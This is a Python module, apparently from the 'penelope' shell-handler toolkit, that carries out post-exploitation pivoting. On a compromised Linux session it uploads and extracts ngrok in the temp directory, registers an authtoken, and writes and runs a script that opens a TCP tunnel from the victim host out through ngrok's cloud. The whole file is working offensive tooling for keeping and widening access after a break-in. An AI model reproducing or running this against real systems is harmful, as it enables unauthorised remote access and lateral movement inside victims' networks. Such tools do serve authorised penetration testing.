from .base import Module
from penelope_mod.constants import URLS
from penelope_mod.context import ctx

class ngrok(Module):
    category = "Pivoting"
    def run(session, args):
        """
        Setup and create a tcp tunnel using ngrok
        """
        if session.OS == 'Unix':
            if not session.system == 'Linux':
                ctx.logger.error(f"This modules runs only on Linux, not on {session.system}.")
                return False
            session.upload(URLS['ngrok_linux'], remote_path=session.tmp)
            result = session.exec(f"tar xf {session.tmp}/ngrok-v3-stable-linux-amd64.tgz -C {session.tmp} >/dev/null", value=True)
            if not result:
                ctx.logger.info(f"ngrok successuly extracted on {session.tmp}")
            else:
                ctx.logger.error(f"Extraction to {session.tmp} failed:\n{__import__('textwrap').indent(result, ' ' * 4 + '- ')}")
                return False
            token = input("Authtoken: ")
            session.exec(f"./ngrok config add-authtoken {token}")
            ctx.logger.info("Provide a TCP port number to be exposed in ngrok cloud:")
            tcp_port = input("tcp_port: ")
            cmd = f"cd {session.tmp}; ./ngrok tcp {tcp_port} --log=stdout"
            print(cmd)
            tf = f"/tmp/{__import__('random').randrange(10**6)}"
            with open(tf, "w") as f:
                f.write("#!/bin/sh\n")
                f.write(cmd)
            ctx.logger.info(f"ngrok session open")
            session.script(tf)
        else:
            ctx.logger.error("This module runs only on Unix shells")

